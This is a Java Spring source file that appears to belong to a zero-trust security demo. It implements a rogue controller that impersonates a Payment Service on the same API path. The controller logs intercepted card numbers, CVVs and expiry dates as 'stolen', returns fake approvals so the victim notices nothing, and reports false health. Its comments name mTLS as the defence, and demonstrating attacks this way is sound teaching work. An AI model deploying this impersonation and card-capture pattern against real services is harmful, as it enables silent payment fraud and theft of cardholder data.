package com.zerotrust.rogue.controller;

import com.zerotrust.rogue.model.PaymentRequest;
import com.zerotrust.rogue.model.PaymentResponse;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.UUID;

@Slf4j
@RestController
@RequestMapping("/api/payment")   // ← identical path to legitimate Payment Service
public class RogueController {

    /**
     * POST /api/payment/process
     *
     * SCENARIO 2 DEMO — Rogue Service impersonates Payment Service.
     *
     *
     * In K8s, the rogue pod runs under the label app=payment-service
     * so the payment-service K8s Service routes traffic here instead
     * of the legitimate pod. Order Service has no idea.
     *
     * What happens:
     *   1. Order Service sends full card payload here (thinking it's real Payment Service)
     *   2. Rogue logs ALL sensitive data — simulates data exfiltration
     *   3. Rogue returns fake APPROVED so Order Service completes normally
     *   4. Attack is completely silent — victim sees no error
     *
     * Scenario 3 fix: mTLS cert-manager certificate CN=payment-service
     * is NOT issued to rogue pod → SSLHandshakeException → attack blocked
     */
    @PostMapping("/process")
    public ResponseEntity<PaymentResponse> stealPayment(@RequestBody PaymentRequest request) {

        // ================================================================
        // ⚠️  ATTACKER EXFILTRATION LOG — all sensitive fields captured
        // ================================================================
        log.error("################################################################");
        log.error("#           ROGUE SERVICE — CARD DATA INTERCEPTED              #");
        log.error("################################################################");
        log.error("  [STOLEN] orderId     = {}", request.getOrderId());
        log.error("  [STOLEN] customerId  = {}", request.getCustomerId());
        log.error("  [STOLEN] cardNumber  = {}", request.getCardNumber());
        log.error("  [STOLEN] cvv         = {}", request.getCvv());
        log.error("  [STOLEN] expiryDate  = {}", request.getExpiryDate());
        log.error("  [STOLEN] amount      = ${}", request.getAmount());
        log.error("################################################################");
        log.error("#     Returning fake APPROVED so victim stays unaware          #");
        log.error("################################################################");

        // Return fake APPROVED — Order Service proceeds normally,
        // completely unaware the card data was just stolen
        String fakeTransactionId = "FAKE-" + UUID.randomUUID()
                .toString().substring(0, 8).toUpperCase();

        return ResponseEntity.ok(
                PaymentResponse.builder()
                        .transactionId(fakeTransactionId)
                        .orderId(request.getOrderId())
                        .customerId(request.getCustomerId())
                        .status("APPROVED")         // fake approval
                        .amount(request.getAmount())
                        .message("Payment processed")   // no hint of attack
                        .build()
        );
    }

    /** Health check */
    @GetMapping("/health")
    public ResponseEntity<String> health() {
        return ResponseEntity.ok("Payment Service is UP");   // deliberately lies
    }
}